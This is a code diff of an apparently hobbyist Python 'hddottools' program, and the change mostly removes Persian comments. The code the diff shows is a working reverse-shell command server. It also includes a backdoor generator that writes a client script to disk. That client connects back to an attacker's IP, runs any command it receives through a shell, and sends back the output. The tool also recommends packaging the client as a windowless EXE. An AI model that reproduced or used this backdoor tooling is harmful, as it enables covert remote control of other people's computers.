@@ -6,7 +6,6 @@ import threading
 import sys
 from arts import art_1, art_2, art_3, art_4, art_5, art_7, art_8, art_9, art_10
 
-# انتخاب تصادفی برای خوش‌آمدگویی
 welcome_arts = [art_1, art_2, art_3, art_4, art_5, art_7, art_8, art_9, art_10]
 welcome = random.choice(welcome_arts)
 
@@ -23,7 +22,7 @@ def az_ina():
     """انیمیشن لودینگ"""
     print("propering:", end="\r")
     frames = ["/", "|", "\\"]
-    for _ in range(3):  # 3 دور کامل
+    for _ in range(3): 
         for frame in frames:
             print(f"propering: {frame}", end="\r")
             time.sleep(0.5)
@@ -42,7 +41,6 @@ def p_board():
     print("   hddottools ver_1.0.1 by github:AltSafe")
     n_l(2)
     
-    # انیمیشن شروع
     for dots in ["starting.", "starting..", "starting..."]:
         print(dots, end="\r")
         time.sleep(1)
@@ -135,9 +133,8 @@ def validate_ip(ip):
 def get_local_ip():
     """دریافت IP محلی سیستم"""
     try:
-        # ایجاد یک سوکت برای اتصال به یک سرور خارجی
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(("8.8.8.8", 80))  # استفاده از DNS گوگل
+        s.connect(("8.8.8.8", 80))  
         local_ip = s.getsockname()[0]
         s.close()
         return local_ip
@@ -147,17 +144,14 @@ def get_local_ip():
 def is_valid_server_ip(ip):
     """بررسی اینکه آیا IP برای سرور معتبر است"""
     if ip == "0.0.0.0":
-        return True  # 0.0.0.0 به معنای همه اینترفیس‌ها است
+        return True  
     elif ip == "127.0.0.1":
-        return True  # localhost
+        return True  
     else:
-        # بررسی اینکه آیا IP متعلق به سیستم است
         try:
-            # دریافت IPهای محلی
             hostname = socket.gethostname()
             local_ips = socket.gethostbyname_ex(hostname)[2]
             
-            # اضافه کردن 127.0.0.1
             local_ips.append("127.0.0.1")
             
             return ip in local_ips
@@ -189,7 +183,6 @@ class ReverseShellServer:
             self.client_socket, self.client_address = self.server_socket.accept()
             print(f"[+] connected of {self.client_address}")
             
-            # شروع مدیریت دستورات
             self.handle_client()
             
         except KeyboardInterrupt:
@@ -216,7 +209,6 @@ class ReverseShellServer:
         """manage connect with client"""
         try:
             while True:
-                # دریافت دستور از کاربر
                 command = input("client => ")
                 
                 if command.lower() == 'exit':
@@ -225,10 +217,8 @@ class ReverseShellServer:
                 elif command.strip() == '':
                     continue
                 
-                # ارسال دستور به کلاینت
                 self.client_socket.send(command.encode())
                 
-                # دریافت پاسخ از کلاینت
                 response = self.receive_data()
                 if response:
                     print(response)
@@ -261,7 +251,6 @@ def start_server_mode():
     print("SERVER MODE")
     print("="*50)
     
-    # دریافت IP از کاربر
     local_ip = get_local_ip()
     print(f"[+] Your local IP: {local_ip}")
     print(f"[+] Localhost IP: 127.0.0.1")
@@ -290,7 +279,6 @@ def start_server_mode():
         else:
             break
     
-    # دریافت پورت از کاربر
     while True:
         port_input = input("Enter server port (default: 5555): ").strip()
         if port_input == "":
@@ -311,7 +299,6 @@ def start_server_mode():
     print(f"    IP: {ip}")
     print(f"    Port: {port}")
     
-    # نمایش اطلاعات اتصال
     if ip == "0.0.0.0":
         print(f"\n[!] Server will listen on ALL network interfaces")
         print(f"[!] Local connections: 127.0.0.1:{port}")
@@ -350,17 +337,14 @@ def parse_backdoor_command(cmd_input):
         return None
     
     try:
-        # پیدا کردن اندیس‌ها
         ip_index = parts.index("--ip")
         port_index = parts.index("--port")
         output_index = parts.index("--o")
         
-        # استخراج مقادیر
         ip = parts[ip_index + 1]
         port = parts[port_index + 1]
         output_path = parts[output_index + 1]
         
-        # اگر مسیر پسوند .py ندارد، اضافه کن
         if not output_path.lower().endswith('.py'):
             output_path = output_path + '.py'
         
@@ -376,7 +360,6 @@ def parse_backdoor_command(cmd_input):
 def create_backdoor_payload(ip, port, output_path):
     """ایجاد فایل پیلود بک‌دور با IP و پورت مشخص شده"""
     
-    # کد کلاینت با جایگزینی IP و پورت
     client_code = f'''import socket
 import subprocess
 import os
@@ -420,7 +403,6 @@ class ReverseShellClient:
     def execute_command(self, command):
         """run the command and return output"""
         try:
-            # change directory
             if command.startswith('cd '):
                 path = command[3:].strip()
                 try:
@@ -429,7 +411,6 @@ class ReverseShellClient:
                 except Exception as e:
                     return f"error raise with change directory: {{e}}"
             
-            # run the command system
             process = subprocess.Popen(
                 command,
                 shell=True,
@@ -451,13 +432,11 @@ class ReverseShellClient:
         
         try:
             while True:
-                # دریافت دستور از سرور
                 command = self.socket.recv(4096).decode('utf-8', errors='ignore')
                 
                 if command.lower() == 'exit':
                     break
                 
-                # اجرای دستور و ارسال نتیجه
                 result = self.execute_command(command)
                 self.socket.send(result.encode())
                 
@@ -470,20 +449,18 @@ class ReverseShellClient:
                 self.socket.close()
 
 if __name__ == "__main__":
-    import time  # فقط برای کلاینت نیاز است
+    import time  
     
     client = ReverseShellClient(server_ip='{ip}', server_port={port})
     client.start()
 '''
     
     try:
-        # بررسی مسیر خروجی
         output_dir = os.path.dirname(output_path)
         if output_dir and not os.path.exists(output_dir):
             os.makedirs(output_dir)
             print(f"[+] Created directory: {output_dir}")
         
-        # نوشتن کد در فایل
         with open(output_path, 'w', encoding='utf-8') as f:
             f.write(client_code)
         
@@ -493,15 +470,13 @@ if __name__ == "__main__":
         print(f"[+] Port: {port}")
         print(f"[+] File size: {len(client_code)} bytes")
         
-        # نمایش اطلاعات اضافی
         print(f"\n[+] File type: Python script (.py)")
         print(f"[+] You can run it with: python {os.path.basename(output_path)}")
         
-        # پیشنهاد برای کامپایل به EXE (اختیاری)
         print("\n[!] Optional: To convert to EXE, you can use PyInstaller:")
         print(f"    pyinstaller --onefile --noconsole {output_path}")
         print("    or")
-        print(f"    pyinstaller --onefile --windowed {output_path}  # بدون کنسول")
+        print(f"    pyinstaller --onefile --windowed {output_path}  ")
         
         return True
         
@@ -527,7 +502,6 @@ def su():
                 print("Exiting backdoor mode...")
                 break
             elif user_input.startswith("backdoor"):
-                # پارس کردن دستور
                 result = parse_backdoor_command(user_input)
                 if result:
                     print(f"\n[+] Backdoor configuration:")
@@ -535,13 +509,11 @@ def su():
                     print(f"    Port: {result['port']}")
                     print(f"    Output file: {result['output_path']}")
                     
-                    # تایید از کاربر
                     confirm = input("\nAre you sure you want to create backdoor? (y/n): ").strip().lower()
                     if confirm == 'y' or confirm == 'yes':
                         print("\n[+] Creating backdoor payload...")
                         time.sleep(1)
                         
-                        # ایجاد پیلود
                         success = create_backdoor_payload(
                             result['ip'], 
                             result['port'], 
@@ -605,5 +577,3 @@ def main():
     p_board()
     main_test_1()
 
-# if __name__ == "__main__":
-#     main()
